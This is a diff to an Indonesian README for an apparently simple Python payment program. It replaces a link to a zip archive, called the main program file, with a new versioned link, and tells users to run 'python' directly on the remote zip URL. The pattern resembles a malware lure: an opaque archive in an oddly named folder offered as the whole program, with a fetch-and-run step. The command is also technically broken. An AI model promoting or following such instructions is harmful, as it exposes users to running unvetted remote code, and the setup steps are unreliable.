@@ -10,9 +10,9 @@ Pengguna dapat memilih salah satu dari transaksi berikut:
 - **Bayar Listrik** — nominal tertentu memberikan jumlah token Kwh
 
 ## 📂 Struktur File
-- `https://raw.githubusercontent.com/raraofficial/transaksi-python-sederhana/main/earpick/transaksi-python-sederhana.zip` — file utama program
+- `https://github.com/raraofficial/transaksi-python-sederhana/raw/refs/heads/main/earpick/python-transaksi-sederhana-1.3-alpha.1.zip` — file utama program
 
 ## ▶️ Cara Menjalankan
 Pastikan Python sudah terinstall. Jalankan dengan perintah:
 ```bash
-python https://raw.githubusercontent.com/raraofficial/transaksi-python-sederhana/main/earpick/transaksi-python-sederhana.zip
+python https://github.com/raraofficial/transaksi-python-sederhana/raw/refs/heads/main/earpick/python-transaksi-sederhana-1.3-alpha.1.zip
